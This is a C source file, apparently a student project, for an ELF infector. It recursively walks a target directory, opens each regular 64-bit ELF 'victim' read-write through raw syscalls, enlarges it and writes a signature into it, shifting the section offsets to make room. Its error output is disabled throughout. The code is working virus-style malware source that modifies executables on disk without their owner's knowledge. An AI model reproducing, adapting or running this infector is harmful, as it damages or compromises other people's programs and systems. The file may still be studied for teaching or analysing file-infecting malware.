#include <sys/mman.h>
#include <sys/stat.h>

#include <sys/types.h>
#include <sys/stat.h>

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#include <stdio.h>
#include <stdint.h>

#include <dirent.h>

#include "libft.h"
#include "woody.h"

#define WMAP(fd, size, prot, flag) _syscall(9, 0, size, prot, flag, fd, 0)

#define VICTIM_MAPFLAG (MAP_SHARED)
#define VICTIM_MAPPROT (PROT_READ | PROT_WRITE)
#define WVMAP(fd, size) WMAP(fd, size, VICTIM_MAPPROT, VICTIM_MAPFLAG)

/* checking elf headers integrity */
#define	WELF_CHECK(ELF, ptr, filesize, jump, shdr, phdr)		\
	if (ELF##_E(ptr)->e_machine != EM_386 &&			\
	    ELF##_E(ptr)->e_machine != EM_X86_64) {			\
		goto jump;						\
	}								\
	if ((ELF##_E(ptr)->e_phnum &&					\
	     (ELF##_E(ptr)->e_phoff != S##ELF##_E ||			\
	      ELF##_E(ptr)->e_phoff + ELF##_E(ptr)->e_phentsize		\
	      * ELF##_E(ptr)->e_phnum > (filesize) ||			\
	      ELF##_E(ptr)->e_phentsize != S##ELF##_P))			\
	    /* */							\
	    ||								\
	    /* section headers */					\
	    (ELF##_E(ptr)->e_shnum &&					\
	     (ELF##_E(ptr)->e_shoff >= (filesize) ||			\
	      ELF##_E(ptr)->e_shoff + ELF##_E(ptr)->e_shentsize		\
	      * ELF##_E(ptr)->e_shnum > (filesize) ||			\
	      ELF##_E(ptr)->e_shentsize != S##ELF##_S ||		\
	      ELF##_E(ptr)->e_shstrndx >= ELF##_E(ptr)->e_shnum))) {	\
		goto jump;						\
	}								\
	(phdr) = ELF##_E(ptr)->e_phoff + (char *)ptr;			\
	(shdr) = ELF##_E(ptr)->e_shoff + (char *)ptr;

/* checking section headers integrity */
#define WELF_SCHECK(ELF_HDR, ptr, filesize, jump)			\
	if ((ELF_HDR(ptr)->sh_name & SHN_LORESERVE) == SHN_LORESERVE)	\
		continue;						\
	if (ELF_HDR(ptr)->sh_type != SHT_NOBITS	&&			\
	    (ELF_HDR(ptr)->sh_offset >= (filesize) ||			\
	     ELF_HDR(ptr)->sh_offset + ELF_HDR(ptr)->sh_size >= (filesize))) { \
		goto jump;						\
	}

/* checking program headers integrity*/
#define WELF_PCHECK(ELF_HDR, ptr, filesize, jump)			\
	if (ELF_HDR(ptr)->p_offset >= (filesize) ||			\
	    ELF_HDR(ptr)->p_offset + ELF_HDR(ptr)->p_filesz >= (filesize)) { \
		goto jump;						\
	}


#define NEXT_HDR(hdr, s)           (hdr) = (((char *)(hdr)) + (s))

int
wopen(const char *victim, WFILE *buf)
{
	struct stat   *_stat;
	WFILE         *new = buf;
	void          *mapv;
	void          *phdr, *shdr;
	void	      *nshdr, *nphdr;
	unsigned char *ident;
	int           fdv;

	if (0 == buf)
		goto fail_open;

	fdv = _syscall(2, victim, O_RDWR);
	if (0 > fdv) {
#if 0
		dprintf(STDERR_FILENO, "fatal: failed to open '%s'\n", victim);
#endif
		goto fail_open;
	}

	if (0 > fstat(fdv, &new->stat)) {
#if 0
		dprintf(STDERR_FILENO, "fatal: could not stat '%s'\n", victim);
#endif
		goto fail_vmap;
	}

	_stat = &new->stat;
	if ((__off_t)SELF64_E > _stat->st_size) {
#if 0
		dprintf(STDERR_FILENO, "Unsupported file '%s'\n", victim);
#endif
		goto fail_vmap;
	}

	mapv = (void *)WVMAP(fdv, _stat->st_size);
	if (MAP_FAILED == mapv) {
#if 0
		dprintf(STDERR_FILENO, "fatal: mmap fail '%s'\n", victim);
#endif
		goto fail_vmap;
	}

	ident = mapv;
	/* GOD FORBIDS */
	if (0 != ft_memcmp(ident, _ELFMAG, SELFMAG)) {
#if 0
		dprintf(STDERR_FILENO, "'%s' is not an elf\n", victim);
#endif
		goto fail_corrupt;
	}

	if (0 == ident[EI_CLASS] ||
	    3 <= ident[EI_CLASS]) {
#if 0
		dprintf(STDERR_FILENO, "Unsupported file '%s'\n", victim);
#endif
		goto fail_corrupt;
	}

	/* This program only supports little endian */
	if (ELFDATA2LSB != ident[EI_DATA]) {
#if 0
		dprintf(STDERR_FILENO, "Unsupported endianess '%s'\n", victim);
#endif
		goto fail_corrupt;
	}

	/* checking if any segment is past size of file */

	if (ident[EI_CLASS] != ELFCLASS64) {
#if 0
		dprintf(STDERR_FILENO, "Unsupported architecture '%s'\n", victim);
#endif
		goto fail_corrupt;
	}

	WELF_CHECK(ELF64, mapv,
		   (long unsigned int)_stat->st_size, /*filesize*/
		   fail_corrupt,                      /*jump*/
		   shdr, phdr);
	nshdr = shdr;

	for (int i = ELF64_E(mapv)->e_shnum; i;
	     i--, NEXT_HDR(nshdr, SELF64_S)) {
		WELF_SCHECK(ELF64_S, nshdr, (long unsigned int)_stat->st_size, fail_corrupt);
	}

	nphdr = phdr;
	for (int i = ELF64_E(mapv)->e_phnum; i;
	     i--, NEXT_HDR(nphdr, SELF64_P)) {
		WELF_PCHECK(ELF64_P, nphdr, (long unsigned int)_stat->st_size, fail_corrupt);
	}

	new->name = victim;
	new->fd = fdv;
	new->map = mapv;
	new->ident = ident;

	new->ehdr = mapv;
	new->phdr = phdr;
	new->shdr = shdr;

	return 0;

fail_corrupt:
	_syscall(11, mapv, _stat->st_size);
fail_vmap:
	_syscall(3, fdv);
fail_open:
	return 1;
}

void
wclose(WFILE *w)
{
	_syscall(11, w->map, w->stat.st_size);
	_syscall(3, w->fd);
}

int
winject(WFILE const *wfil)
{
	void *ehdr, *shdr;


	size_t filsz, added;
	int  nasec = -1;
	int64_t addr_sign;

	if (0 == wfil)
		goto fail;

	ehdr = wfil->ehdr;
	shdr = wfil->shdr;
	int dx;
	
#define LF_SECTION(condition, inst)					\
	for (dx = 0; dx < ELF64_E(ehdr)->e_shnum; dx++){		\
		if (condition)						\
			inst;						\
	}

	/* search the first no alloc section */
	LF_SECTION(!(ELF64_S(shdr)[dx].sh_flags & SHF_ALLOC) && dx,
		{ nasec = dx; break ; });


	/* addr inject signature */
	if (nasec == -1)//"write in end of file");
		addr_sign = wfil->stat.st_size;
	else
		addr_sign = ELF64_S(shdr)[nasec].sh_offset;

	/* size signature + align */
	added = FSIGN_TSIZE;
#if 0
	/* ?? */
	added += 0xfff;
	added &= ~0xfff; /* align */
	/* ... */
#else
	added += 0xf;
	added &= ~0xf;
#endif

	/* is sign ? */
	if(!ft_memcmp(wfil->map + addr_sign - added, FSIGN_STR, FSIGN_TSIZE))
		return (1);

	/* grow file */
	filsz = wfil->stat.st_size;
	filsz += added;
	if (_syscall(77, wfil->fd, filsz)) {
#if 0
		dprintf(STDERR_FILENO, "fatal ftruncate error\n");
#endif
		goto fail;
	}

	/* write sign */
	if (nasec != -1)
	{
		ELF64_E(ehdr)->e_shoff += added;
		for (int dx = nasec; dx < ELF64_E(ehdr)->e_shnum; dx++)
			(ELF64_S(shdr)[dx].sh_offset) += added;
		ft_memcpy(wfil->map + addr_sign + added,
			wfil->map + addr_sign,
			filsz - addr_sign);
	}
	ft_memcpy(wfil->map + addr_sign, FSIGN_STR, FSIGN_TSIZE);

	_syscall(11, wfil->map, filsz);
	return 0;
fail:
	return -1;
}

#define BUF_SIZE 1024
struct linux_dirent {
	long           d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};

void exe_dir2(char *cible, int len)
{
	WFILE w;
	int fd, nread, bpos;
	char buf[BUF_SIZE];
	struct linux_dirent *dir;
	char d_type;

	*(cible + len++) = '/';
	*(cible + len) = '\0';
	fd = _syscall(2, cible, O_RDONLY);
	while ((nread = _syscall(78, fd, buf, BUF_SIZE)) > 0)
		for (bpos=0; bpos < nread;)
		{
			dir = (struct linux_dirent *)(buf + bpos);
			if ((*(dir->d_name) != '.' || !(*(dir->d_name + 1) == '\0' ||
			(*(dir->d_name + 1) == '.' && *(dir->d_name + 2) == '\0'))))
			{
				ft_strcpy(cible + len, dir->d_name);
				d_type = *(buf + bpos + dir->d_reclen - 1);
				if (d_type == DT_DIR)
					exe_dir2(cible, len + ft_strlen(dir->d_name));
				else if (d_type == DT_REG && !wopen(cible, &w))
				{
					winject(&w);
#if 0
					printf((!ret)?"SUCCESS\n" : (ret == 1) ? "OK\n" : "ERROR\n");
#endif
					wclose(&w);
				}
			}
			bpos += dir->d_reclen;
		}
	_syscall(3, fd);
}

int
main(void)
{
	char	cible[FILENAME_MAX];

	
	ft_strcpy(cible, DIR_CIBLE);
	exe_dir2(cible, ft_strlen(DIR_CIBLE));
	return 1;
}
